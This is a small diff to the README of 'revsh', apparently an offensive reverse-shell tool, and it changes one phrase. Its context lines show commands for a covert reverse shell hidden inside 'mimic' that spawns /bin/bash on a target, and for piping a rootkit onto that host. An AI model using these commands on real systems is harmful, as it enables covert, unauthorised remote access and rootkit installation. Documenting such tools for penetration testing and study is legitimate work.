@@ -117,7 +117,7 @@ For a covert reverse shell, _revsh_ can be invoked from within [_mimic_](https:/
 	empty@monkey:~$ revsh -c
 	target@kitty:~$ ./mimic -q -e './revsh -s "./mimic -e /bin/bash"'
 
-For netcat style data transfer (with the crypto benefits of _revsh_) invoke _revsh_ with the -n switch. This is useful for moving tools on to the target host:
+For netcat style data transfer (with all of the crypto benefits of _revsh_) invoke _revsh_ with the -n switch. This is useful for moving tools on to the target host:
 
 	empty@monkey:~$ cat rootkit.tar | ./revsh -c -n
 	target@kitty:~$ ./revsh >./totally_not_a_rootkit.tar
